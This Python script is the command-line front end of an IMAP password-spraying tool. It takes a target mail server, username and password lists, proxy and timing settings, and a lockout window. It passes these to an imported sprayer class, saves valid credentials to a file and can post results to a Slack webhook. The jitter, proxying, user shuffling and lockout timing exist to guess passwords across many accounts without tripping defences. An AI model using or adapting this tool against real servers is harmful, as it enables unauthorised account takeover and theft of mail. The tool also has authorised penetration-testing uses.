#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2022 Mayk
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

"""A simple IMAP password sprayer."""
from sys import exit
from argparse import ArgumentParser
from imaplib import IMAP4_PORT, IMAP4_SSL_PORT
from core.utils.helpers import *
from core.sprayer.imap import IMAPSprayer

# Print the banner
def banner(args):
    BANNER = (
        "  ███                                                                                                         \n"
        " ░░░                                                                                                          \n"
        " ████  █████████████    ██████   ████████   █████  ████████  ████████   ██████   █████ ████  ██████  ████████ \n"
        "░░███ ░░███░░███░░███  ░░░░░███ ░░███░░███ ███░░  ░░███░░███░░███░░███ ░░░░░███ ░░███ ░███  ███░░███░░███░░███\n"
        " ░███  ░███ ░███ ░███   ███████  ░███ ░███░░█████  ░███ ░███ ░███ ░░░   ███████  ░███ ░███ ░███████  ░███ ░░░ \n"
        " ░███  ░███ ░███ ░███  ███░░███  ░███ ░███ ░░░░███ ░███ ░███ ░███      ███░░███  ░███ ░███ ░███░░░   ░███     \n"
        " █████ █████░███ █████░░████████ ░███████  ██████  ░███████  █████    ░░████████ ░░███████ ░░██████  █████    \n"
        "░░░░░ ░░░░░ ░░░ ░░░░░  ░░░░░░░░  ░███░░░  ░░░░░░   ░███░░░  ░░░░░      ░░░░░░░░   ░░░░░███  ░░░░░░  ░░░░░     \n"
        "                                 ░███              ░███                           ███ ░███                    \n"
        "                                 █████             █████                         ░░██████                     \n"
        "                                ░░░░░             ░░░░░                           ░░░░░░                      \n"
        "                                                                                                                 \n"
    )

    _args = vars(args)
    for arg in _args:
        if _args[arg]:
            space = " " * (15 - len(arg))

            BANNER += "\n   > %s%s:  %s" % (arg, space, str(_args[arg]))

            # Add data meanings
            if arg == "lockout":
                BANNER += " minutes"

            if arg in ["wait", "jitter"]:
                BANNER += " seconds"

    BANNER += "\n"
    BANNER += "\n>----------------------------------------<\n"

    print(BANNER)


if __name__ == "__main__":
    parser = ArgumentParser(description="A simple IMAP password sprayer.")
    parser.add_argument(
        "-t", "--target", type=str, help="Target host (required)", required=True
    )
    parser.add_argument(
        "--port",
        type=int,
        help=f"Target port (default {IMAP4_SSL_PORT} when using --ssl, {IMAP4_PORT} otherwise)",
        required=False,
    )
    parser.add_argument(
        "--ssl",
        action="store_true",
        help="Connect to server over an SSL encrypted socket",
        required=False,
    )
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_user.add_argument("-u", "--username", type=str, help="Single username")
    group_user.add_argument(
        "-U", "--usernames", type=str, metavar="FILE", help="File containing usernames"
    )
    group_password = parser.add_mutually_exclusive_group(required=True)
    group_password.add_argument("-p", "--password", type=str, help="Single password")
    group_password.add_argument(
        "-P", "--passwords", type=str, help="File containing passwords", metavar="FILE"
    )
    parser.add_argument(
        "-o",
        "--output",
        type=str,
        default="valid_creds.txt",
        help="Output file (default: %(default)s)",
        required=False,
    )
    parser.add_argument(
        "-x",
        "--proxy",
        type=str,
        help="Proxy to pass traffic through: <scheme://ip:port>",
        required=False,
    )
    parser.add_argument(
        "--sleep",
        type=float,
        help="Sleep time (in seconds) between each iteration (default: %(default)s)",
        default=0,
        required=False,
    )
    parser.add_argument(
        "--jitter",
        type=int,
        help="Max jitter (in seconds) to be added to sleep time (default: %(default)s)",
        default=0,
        required=False,
    )
    parser.add_argument(
        "--lockout",
        type=float,
        required=True,
        help="Lockout policy reset time (in minutes) (required)",
    )
    parser.add_argument(
        "--timeout",
        help="Socket timeout, in seconds (default: %(default)s)",
        default=None,
        required=False,
        type=int
    )
    parser.add_argument(
        "--slack",
        type=str,
        help="Slack webhook for sending notifications (default: %(default)s)",
        default=None,
        required=False,
    )
    parser.add_argument(
        "-s", "--shuffle", action="store_true", help="Shuffle user list", required=False
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Verbose output", required=False
    )

    args = parser.parse_args()

    assert args.port is None or args.port >= 0
    assert args.sleep >= 0
    assert args.jitter >= 0
    assert args.lockout >= 0
    assert args.timeout is None or args.timeout >= 0

    if args.proxy:
        args.proxy = args.proxy.lower()
        if args.proxy.startswith("http"):
            print("HTTP proxy not supported")
            exit(1)

    # Print the banner
    banner(args)

    try:
        username_list = (
            [args.username] if args.username else get_list_from_file(args.usernames)
        )

        password_list = (
            [args.password] if args.password else get_list_from_file(args.passwords)
        )
        sprayer = IMAPSprayer(
            target=args.target,
            port=args.port,
            ssl=args.ssl,
            proxy=args.proxy,
            timeout=args.timeout
        )
        sprayer.spray(userlist=username_list,
            passwordlist=password_list,
            sleep=args.sleep,
            jitter=args.jitter,
            lockout=args.lockout,
            randomize=args.shuffle,
            slack=args.slack
        )
        sprayer.spray_stats(output=args.output, slack=args.slack)
    except IOError as e:
        print(e)
        exit(1)
